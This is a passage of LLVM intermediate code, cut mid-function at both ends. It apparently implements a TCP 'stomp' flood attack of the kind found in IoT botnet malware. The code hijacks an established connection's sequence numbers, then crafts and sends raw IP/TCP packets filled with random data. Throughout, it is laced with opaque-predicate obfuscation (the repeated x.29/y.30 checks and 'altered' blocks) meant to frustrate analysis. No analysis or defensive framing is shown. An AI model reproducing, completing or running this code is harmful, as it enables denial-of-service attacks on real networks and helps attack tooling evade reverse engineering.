  store i16 %229, i16* %230, align 2
  br label %231

; <label>:231:                                    ; preds = %227, %originalBBpart212
  %232 = load i32, i32* @x.29
  %233 = load i32, i32* @y.30
  %234 = sub i32 %232, 1
  %235 = mul i32 %232, %234
  %236 = urem i32 %235, 2
  %237 = icmp eq i32 %236, 0
  %238 = icmp slt i32 %233, 10
  %239 = or i1 %237, %238
  br i1 %239, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %231
  %240 = load i32, i32* %26, align 4
  %241 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %242 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %242, %struct.sockaddr** %241, align 8
  %243 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %244 = load %struct.sockaddr*, %struct.sockaddr** %243, align 8
  %245 = call i32 @connect(i32 %240, %struct.sockaddr* %244, i32 16)
  %246 = call i64 @time(i64* null) #6
  store i64 %246, i64* %31, align 8
  %247 = load i32, i32* @x.29
  %248 = load i32, i32* @y.30
  %249 = sub i32 %247, 1
  %250 = mul i32 %247, %249
  %251 = urem i32 %250, 2
  %252 = icmp eq i32 %251, 0
  %253 = icmp slt i32 %248, 10
  %254 = or i1 %252, %253
  br i1 %254, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %255

; <label>:255:                                    ; preds = %originalBBpart2285, %originalBBpart216
  %256 = load i32, i32* @x.29
  %257 = load i32, i32* @y.30
  %258 = sub i32 %256, 1
  %259 = mul i32 %256, %258
  %260 = urem i32 %259, 2
  %261 = icmp eq i32 %260, 0
  %262 = icmp slt i32 %257, 10
  %263 = or i1 %261, %262
  br i1 %263, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %255
  store i32 16, i32* %29, align 4
  %264 = load i32, i32* %10, align 4
  %265 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %266 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %267 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %267, %struct.sockaddr** %266, align 8
  %268 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %269 = load %struct.sockaddr*, %struct.sockaddr** %268, align 8
  %270 = call i64 @recvfrom(i32 %264, i8* %265, i64 256, i32 16384, %struct.sockaddr* %269, i32* %29)
  %271 = trunc i64 %270 to i32
  store i32 %271, i32* %33, align 4
  %272 = load i32, i32* %33, align 4
  %273 = icmp eq i32 %272, -1
  %274 = load i32, i32* @x.29
  %275 = load i32, i32* @y.30
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %273, label %282, label %299

; <label>:282:                                    ; preds = %originalBBpart220
  %283 = load i32, i32* @x.29
  %284 = load i32, i32* @y.30
  %285 = sub i32 %283, 1
  %286 = mul i32 %283, %285
  %287 = urem i32 %286, 2
  %288 = icmp eq i32 %287, 0
  %289 = icmp slt i32 %284, 10
  %290 = or i1 %288, %289
  br i1 %290, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %282
  %291 = load i32, i32* @x.29
  %292 = load i32, i32* @y.30
  %293 = sub i32 %291, 1
  %294 = mul i32 %291, %293
  %295 = urem i32 %294, 2
  %296 = icmp eq i32 %295, 0
  %297 = icmp slt i32 %292, 10
  %298 = or i1 %296, %297
  br i1 %298, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br label %815

; <label>:299:                                    ; preds = %originalBBpart220
  %300 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %301 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %300, i32 0, i32 0
  %302 = load i32, i32* %301, align 4
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %304 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %303, i32 0, i32 0
  %305 = load i32, i32* %304, align 4
  %306 = icmp eq i32 %302, %305
  br i1 %306, label %307, label %626

; <label>:307:                                    ; preds = %299
  %308 = load i32, i32* %33, align 4
  %309 = sext i32 %308 to i64
  %310 = icmp ugt i64 %309, 40
  br i1 %310, label %311, label %626

; <label>:311:                                    ; preds = %307
  %312 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %313 = getelementptr inbounds i8, i8* %312, i64 20
  %314 = bitcast i8* %313 to %struct.tcphdr*
  store %struct.tcphdr* %314, %struct.tcphdr** %35, align 8
  %315 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %316 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %315, i32 0, i32 0
  %317 = load i16, i16* %316, align 4
  %318 = zext i16 %317 to i32
  %319 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %320 = load i16, i16* %319, align 2
  %321 = zext i16 %320 to i32
  %322 = icmp eq i32 %318, %321
  br i1 %322, label %323, label %625

; <label>:323:                                    ; preds = %311
  %324 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %325 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %324, i32 0, i32 4
  %326 = load i16, i16* %325, align 4
  %327 = lshr i16 %326, 9
  %328 = and i16 %327, 1
  %329 = zext i16 %328 to i32
  %330 = icmp ne i32 %329, 0
  br i1 %330, label %331, label %588

; <label>:331:                                    ; preds = %323
  %332 = load i32, i32* @x.29
  %333 = load i32, i32* @y.30
  %334 = sub i32 %332, 1
  %335 = mul i32 %332, %334
  %336 = urem i32 %335, 2
  %337 = icmp eq i32 %336, 0
  %338 = icmp slt i32 %333, 10
  %339 = or i1 %337, %338
  br i1 %339, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %331
  %340 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %341 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %340, i32 0, i32 4
  %342 = load i16, i16* %341, align 4
  %343 = lshr i16 %342, 12
  %344 = and i16 %343, 1
  %345 = zext i16 %344 to i32
  %346 = icmp ne i32 %345, 0
  %347 = load i32, i32* @x.29
  %348 = load i32, i32* @y.30
  %349 = sub i32 %347, 1
  %350 = mul i32 %347, %349
  %351 = urem i32 %350, 2
  %352 = icmp eq i32 %351, 0
  %353 = icmp slt i32 %348, 10
  %354 = or i1 %352, %353
  br i1 %354, label %originalBBpart238, label %originalBB26alteredBB

originalBBpart238:                                ; preds = %originalBB26
  br i1 %346, label %355, label %588

; <label>:355:                                    ; preds = %originalBBpart238
  %356 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %357 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %356, i32 0, i32 0
  %358 = load i32, i32* %357, align 4
  %359 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %360 = load i32, i32* %9, align 4
  %361 = sext i32 %360 to i64
  %362 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %359, i64 %361
  %363 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %362, i32 0, i32 0
  store i32 %358, i32* %363, align 4
  %364 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %365 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %364, i32 0, i32 2
  %366 = load i32, i32* %365, align 4
  %367 = call i32 @ntohl(i32 %366) #7
  %368 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %371, i32 0, i32 1
  store i32 %367, i32* %372, align 4
  %373 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %374 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %373, i32 0, i32 3
  %375 = load i32, i32* %374, align 4
  %376 = call i32 @ntohl(i32 %375) #7
  %377 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %378 = load i32, i32* %9, align 4
  %379 = sext i32 %378 to i64
  %380 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %377, i64 %379
  %381 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %380, i32 0, i32 2
  store i32 %376, i32* %381, align 4
  %382 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %383 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %382, i32 0, i32 1
  %384 = load i16, i16* %383, align 2
  %385 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %386 = load i32, i32* %9, align 4
  %387 = sext i32 %386 to i64
  %388 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %385, i64 %387
  %389 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %388, i32 0, i32 3
  store i16 %384, i16* %389, align 4
  %390 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %391 = load i16, i16* %390, align 2
  %392 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %393 = load i32, i32* %9, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %392, i64 %394
  %396 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %395, i32 0, i32 4
  store i16 %391, i16* %396, align 2
  %397 = load i32, i32* %24, align 4
  %398 = sext i32 %397 to i64
  %399 = add i64 40, %398
  %400 = call noalias i8* @malloc(i64 %399) #6
  %401 = load i8**, i8*** %12, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds i8*, i8** %401, i64 %403
  store i8* %400, i8** %404, align 8
  %405 = load i8**, i8*** %12, align 8
  %406 = load i32, i32* %9, align 4
  %407 = sext i32 %406 to i64
  %408 = getelementptr inbounds i8*, i8** %405, i64 %407
  %409 = load i8*, i8** %408, align 8
  %410 = bitcast i8* %409 to %struct.iphdr*
  store %struct.iphdr* %410, %struct.iphdr** %36, align 8
  %411 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %412 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %411, i64 1
  %413 = bitcast %struct.iphdr* %412 to %struct.tcphdr*
  store %struct.tcphdr* %413, %struct.tcphdr** %37, align 8
  %414 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %415 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %414, i64 1
  %416 = bitcast %struct.tcphdr* %415 to i8*
  store i8* %416, i8** %38, align 8
  %417 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %418 = bitcast %struct.iphdr* %417 to i8*
  %419 = load i8, i8* %418, align 4
  %420 = and i8 %419, 15
  %421 = or i8 %420, 64
  store i8 %421, i8* %418, align 4
  %422 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %423 = bitcast %struct.iphdr* %422 to i8*
  %424 = load i8, i8* %423, align 4
  %425 = and i8 %424, -16
  %426 = or i8 %425, 5
  store i8 %426, i8* %423, align 4
  %427 = load i8, i8* %13, align 1
  %428 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %429 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %428, i32 0, i32 1
  store i8 %427, i8* %429, align 1
  %430 = load i32, i32* %24, align 4
  %431 = sext i32 %430 to i64
  %432 = add i64 40, %431
  %433 = trunc i64 %432 to i16
  %434 = call zeroext i16 @htons(i16 zeroext %433) #7
  %435 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %436 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %435, i32 0, i32 2
  store i16 %434, i16* %436, align 2
  %437 = load i16, i16* %14, align 2
  %438 = call zeroext i16 @htons(i16 zeroext %437) #7
  %439 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %440 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %439, i32 0, i32 3
  store i16 %438, i16* %440, align 4
  %441 = load i8, i8* %15, align 1
  %442 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %443 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %442, i32 0, i32 5
  store i8 %441, i8* %443, align 4
  %444 = load i8, i8* %16, align 1
  %445 = icmp ne i8 %444, 0
  br i1 %445, label %446, label %450

; <label>:446:                                    ; preds = %355
  %447 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %448 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %449 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %448, i32 0, i32 4
  store i16 %447, i16* %449, align 2
  br label %450

; <label>:450:                                    ; preds = %446, %355
  %451 = load i32, i32* @x.29
  %452 = load i32, i32* @y.30
  %453 = sub i32 %451, 1
  %454 = mul i32 %451, %453
  %455 = urem i32 %454, 2
  %456 = icmp eq i32 %455, 0
  %457 = icmp slt i32 %452, 10
  %458 = or i1 %456, %457
  br i1 %458, label %originalBB40, label %originalBB40alteredBB

originalBB40:                                     ; preds = %originalBB40alteredBB, %450
  %459 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 6
  store i8 6, i8* %460, align 1
  %461 = load i32, i32* @LOCAL_ADDR, align 4
  %462 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %463 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %462, i32 0, i32 8
  store i32 %461, i32* %463, align 4
  %464 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %465 = load i32, i32* %9, align 4
  %466 = sext i32 %465 to i64
  %467 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %464, i64 %466
  %468 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %467, i32 0, i32 0
  %469 = load i32, i32* %468, align 4
  %470 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 9
  store i32 %469, i32* %471, align 4
  %472 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %473 = load i32, i32* %9, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %475, i32 0, i32 3
  %477 = load i16, i16* %476, align 4
  %478 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %479 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %478, i32 0, i32 0
  store i16 %477, i16* %479, align 4
  %480 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %481 = load i32, i32* %9, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %480, i64 %482
  %484 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %483, i32 0, i32 4
  %485 = load i16, i16* %484, align 2
  %486 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 1
  store i16 %485, i16* %487, align 2
  %488 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %489 = load i32, i32* %9, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %491, i32 0, i32 2
  %493 = load i32, i32* %492, align 4
  %494 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 2
  store i32 %493, i32* %495, align 4
  %496 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %497 = load i32, i32* %9, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %499, i32 0, i32 1
  %501 = load i32, i32* %500, align 4
  %502 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 3
  store i32 %501, i32* %503, align 4
  %504 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %505 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %504, i32 0, i32 4
  %506 = load i16, i16* %505, align 4
  %507 = and i16 %506, -241
  %508 = or i16 %507, 128
  store i16 %508, i16* %505, align 4
  %509 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %510 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %509, i32 0, i32 4
  %511 = load i16, i16* %510, align 4
  %512 = and i16 %511, -257
  %513 = or i16 %512, 256
  store i16 %513, i16* %510, align 4
  %514 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %515 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %514, i32 0, i32 4
  %516 = load i16, i16* %515, align 4
  %517 = and i16 %516, -4097
  %518 = or i16 %517, 4096
  store i16 %518, i16* %515, align 4
  %519 = call i32 @rand_next()
  %520 = and i32 %519, 65535
  %521 = trunc i32 %520 to i16
  %522 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 5
  store i16 %521, i16* %523, align 2
  %524 = load i8, i8* %18, align 1
  %525 = sext i8 %524 to i16
  %526 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %527 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %526, i32 0, i32 4
  %528 = load i16, i16* %527, align 4
  %529 = and i16 %525, 1
  %530 = shl i16 %529, 13
  %531 = and i16 %528, -8193
  %532 = or i16 %531, %530
  store i16 %532, i16* %527, align 4
  %533 = load i8, i8* %19, align 1
  %534 = sext i8 %533 to i16
  %535 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %536 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %535, i32 0, i32 4
  %537 = load i16, i16* %536, align 4
  %538 = and i16 %534, 1
  %539 = shl i16 %538, 12
  %540 = and i16 %537, -4097
  %541 = or i16 %540, %539
  store i16 %541, i16* %536, align 4
  %542 = load i8, i8* %20, align 1
  %543 = sext i8 %542 to i16
  %544 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %545 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %544, i32 0, i32 4
  %546 = load i16, i16* %545, align 4
  %547 = and i16 %543, 1
  %548 = shl i16 %547, 11
  %549 = and i16 %546, -2049
  %550 = or i16 %549, %548
  store i16 %550, i16* %545, align 4
  %551 = load i8, i8* %21, align 1
  %552 = sext i8 %551 to i16
  %553 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %554 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %553, i32 0, i32 4
  %555 = load i16, i16* %554, align 4
  %556 = and i16 %552, 1
  %557 = shl i16 %556, 10
  %558 = and i16 %555, -1025
  %559 = or i16 %558, %557
  store i16 %559, i16* %554, align 4
  %560 = load i8, i8* %22, align 1
  %561 = sext i8 %560 to i16
  %562 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %563 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %562, i32 0, i32 4
  %564 = load i16, i16* %563, align 4
  %565 = and i16 %561, 1
  %566 = shl i16 %565, 9
  %567 = and i16 %564, -513
  %568 = or i16 %567, %566
  store i16 %568, i16* %563, align 4
  %569 = load i8, i8* %23, align 1
  %570 = sext i8 %569 to i16
  %571 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %572 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %571, i32 0, i32 4
  %573 = load i16, i16* %572, align 4
  %574 = and i16 %570, 1
  %575 = shl i16 %574, 8
  %576 = and i16 %573, -257
  %577 = or i16 %576, %575
  store i16 %577, i16* %572, align 4
  %578 = load i8*, i8** %38, align 8
  %579 = load i32, i32* %24, align 4
  call void @rand_str(i8* %578, i32 %579)
  %580 = load i32, i32* @x.29
  %581 = load i32, i32* @y.30
  %582 = sub i32 %580, 1
  %583 = mul i32 %580, %582
  %584 = urem i32 %583, 2
  %585 = icmp eq i32 %584, 0
  %586 = icmp slt i32 %581, 10
  %587 = or i1 %585, %586
  br i1 %587, label %originalBBpart2277, label %originalBB40alteredBB

originalBBpart2277:                               ; preds = %originalBB40
  br label %651

; <label>:588:                                    ; preds = %originalBBpart238, %323
  %589 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %590 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %589, i32 0, i32 4
  %591 = load i16, i16* %590, align 4
  %592 = lshr i16 %591, 8
  %593 = and i16 %592, 1
  %594 = zext i16 %593 to i32
  %595 = icmp ne i32 %594, 0
  br i1 %595, label %604, label %596

; <label>:596:                                    ; preds = %588
  %597 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %598 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %597, i32 0, i32 4
  %599 = load i16, i16* %598, align 4
  %600 = lshr i16 %599, 10
  %601 = and i16 %600, 1
  %602 = zext i16 %601 to i32
  %603 = icmp ne i32 %602, 0
  br i1 %603, label %604, label %607

; <label>:604:                                    ; preds = %596, %588
  %605 = load i32, i32* %26, align 4
  %606 = call i32 @close(i32 %605)
  br label %137

; <label>:607:                                    ; preds = %596
  %608 = load i32, i32* @x.29
  %609 = load i32, i32* @y.30
  %610 = sub i32 %608, 1
  %611 = mul i32 %608, %610
  %612 = urem i32 %611, 2
  %613 = icmp eq i32 %612, 0
  %614 = icmp slt i32 %609, 10
  %615 = or i1 %613, %614
  br i1 %615, label %originalBB279, label %originalBB279alteredBB

originalBB279:                                    ; preds = %originalBB279alteredBB, %607
  %616 = load i32, i32* @x.29
  %617 = load i32, i32* @y.30
  %618 = sub i32 %616, 1
  %619 = mul i32 %616, %618
  %620 = urem i32 %619, 2
  %621 = icmp eq i32 %620, 0
  %622 = icmp slt i32 %617, 10
  %623 = or i1 %621, %622
  br i1 %623, label %originalBBpart2281, label %originalBB279alteredBB

originalBBpart2281:                               ; preds = %originalBB279
  br label %624

; <label>:624:                                    ; preds = %originalBBpart2281
  br label %625

; <label>:625:                                    ; preds = %624, %311
  br label %626

; <label>:626:                                    ; preds = %625, %307, %299
  %627 = call i64 @time(i64* null) #6
  %628 = load i64, i64* %31, align 8
  %629 = sub nsw i64 %627, %628
  %630 = icmp sgt i64 %629, 10
  br i1 %630, label %631, label %634

; <label>:631:                                    ; preds = %626
  %632 = load i32, i32* %26, align 4
  %633 = call i32 @close(i32 %632)
  br label %137

; <label>:634:                                    ; preds = %626
  %635 = load i32, i32* @x.29
  %636 = load i32, i32* @y.30
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB283, label %originalBB283alteredBB

originalBB283:                                    ; preds = %originalBB283alteredBB, %634
  %643 = load i32, i32* @x.29
  %644 = load i32, i32* @y.30
  %645 = sub i32 %643, 1
  %646 = mul i32 %643, %645
  %647 = urem i32 %646, 2
  %648 = icmp eq i32 %647, 0
  %649 = icmp slt i32 %644, 10
  %650 = or i1 %648, %649
  br i1 %650, label %originalBBpart2285, label %originalBB283alteredBB

originalBBpart2285:                               ; preds = %originalBB283
  br label %255

; <label>:651:                                    ; preds = %originalBBpart2277
  br label %652

; <label>:652:                                    ; preds = %651, %originalBBpart24
  %653 = load i32, i32* %9, align 4
  %654 = add nsw i32 %653, 1
  store i32 %654, i32* %9, align 4
  br label %131

; <label>:655:                                    ; preds = %131
  br label %656

; <label>:656:                                    ; preds = %originalBBpart2329, %655
  store i32 0, i32* %9, align 4
  br label %657

; <label>:657:                                    ; preds = %795, %656
  %658 = load i32, i32* %9, align 4
  %659 = load i8, i8* %5, align 1
  %660 = zext i8 %659 to i32
  %661 = icmp slt i32 %658, %660
  br i1 %661, label %662, label %798

; <label>:662:                                    ; preds = %657
  %663 = load i32, i32* @x.29
  %664 = load i32, i32* @y.30
  %665 = sub i32 %663, 1
  %666 = mul i32 %663, %665
  %667 = urem i32 %666, 2
  %668 = icmp eq i32 %667, 0
  %669 = icmp slt i32 %664, 10
  %670 = or i1 %668, %669
  br i1 %670, label %originalBB287, label %originalBB287alteredBB

originalBB287:                                    ; preds = %originalBB287alteredBB, %662
  %671 = load i8**, i8*** %12, align 8
  %672 = load i32, i32* %9, align 4
  %673 = sext i32 %672 to i64
  %674 = getelementptr inbounds i8*, i8** %671, i64 %673
  %675 = load i8*, i8** %674, align 8
  store i8* %675, i8** %39, align 8
  %676 = load i8*, i8** %39, align 8
  %677 = bitcast i8* %676 to %struct.iphdr*
  store %struct.iphdr* %677, %struct.iphdr** %40, align 8
  %678 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %679 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %678, i64 1
  %680 = bitcast %struct.iphdr* %679 to %struct.tcphdr*
  store %struct.tcphdr* %680, %struct.tcphdr** %41, align 8
  %681 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %682 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %681, i64 1
  %683 = bitcast %struct.tcphdr* %682 to i8*
  store i8* %683, i8** %42, align 8
  %684 = load i16, i16* %14, align 2
  %685 = zext i16 %684 to i32
  %686 = icmp eq i32 %685, 65535
  %687 = load i32, i32* @x.29
  %688 = load i32, i32* @y.30
  %689 = sub i32 %687, 1
  %690 = mul i32 %687, %689
  %691 = urem i32 %690, 2
  %692 = icmp eq i32 %691, 0
  %693 = icmp slt i32 %688, 10
  %694 = or i1 %692, %693
  br i1 %694, label %originalBBpart2289, label %originalBB287alteredBB

originalBBpart2289:                               ; preds = %originalBB287
  br i1 %686, label %695, label %701

; <label>:695:                                    ; preds = %originalBBpart2289
  %696 = call i32 @rand_next()
  %697 = and i32 %696, 65535
  %698 = trunc i32 %697 to i16
  %699 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %700 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %699, i32 0, i32 3
  store i16 %698, i16* %700, align 4
  br label %701

; <label>:701:                                    ; preds = %695, %originalBBpart2289
  %702 = load i8, i8* %25, align 1
  %703 = icmp ne i8 %702, 0
  br i1 %703, label %704, label %707

; <label>:704:                                    ; preds = %701
  %705 = load i8*, i8** %42, align 8
  %706 = load i32, i32* %24, align 4
  call void @rand_str(i8* %705, i32 %706)
  br label %707

; <label>:707:                                    ; preds = %704, %701
  %708 = load i32, i32* @x.29
  %709 = load i32, i32* @y.30
  %710 = sub i32 %708, 1
  %711 = mul i32 %708, %710
  %712 = urem i32 %711, 2
  %713 = icmp eq i32 %712, 0
  %714 = icmp slt i32 %709, 10
  %715 = or i1 %713, %714
  br i1 %715, label %originalBB291, label %originalBB291alteredBB

originalBB291:                                    ; preds = %originalBB291alteredBB, %707
  %716 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %717 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %716, i32 0, i32 7
  store i16 0, i16* %717, align 2
  %718 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %719 = bitcast %struct.iphdr* %718 to i16*
  %720 = call zeroext i16 @checksum_generic(i16* %719, i32 20)
  %721 = load %struct.iphdr*, %struct.iphdr** %40, align 8
  %722 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %721, i32 0, i32 7
  store i16 %720, i16* %722, align 2
  %723 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %724 = load i32, i32* %9, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %723, i64 %725
  %727 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %726, i32 0, i32 1
  %728 = load i32, i32* %727, align 4
  %729 = add i32 %728, 1
  store i32 %729, i32* %727, align 4
  %730 = trunc i32 %728 to i16
  %731 = call zeroext i16 @htons(i16 zeroext %730) #7
  %732 = zext i16 %731 to i32
  %733 = load %struct.tcphdr*, %struct.tcphdr** %41, align 8
  %734 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %733, i32 0, i32 2
  store i32 %732, i32* %734, align 4
  %735 = load %struct.attack_stomp_data*, %struct.attack_stomp_data** %11, align 8
  %736 = load i32, i32* %9, align 4
  %737 = sext i32 %736 to i64
  %738 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %735, i64 %737
  %739 = getelementptr inbounds %struct.attack_stomp_data, %struct.attack_stomp_data* %738, i32 0, i32 2
  %740 = load i32, i32* %739, align 4
  %741 = trunc i32 %740 to i16
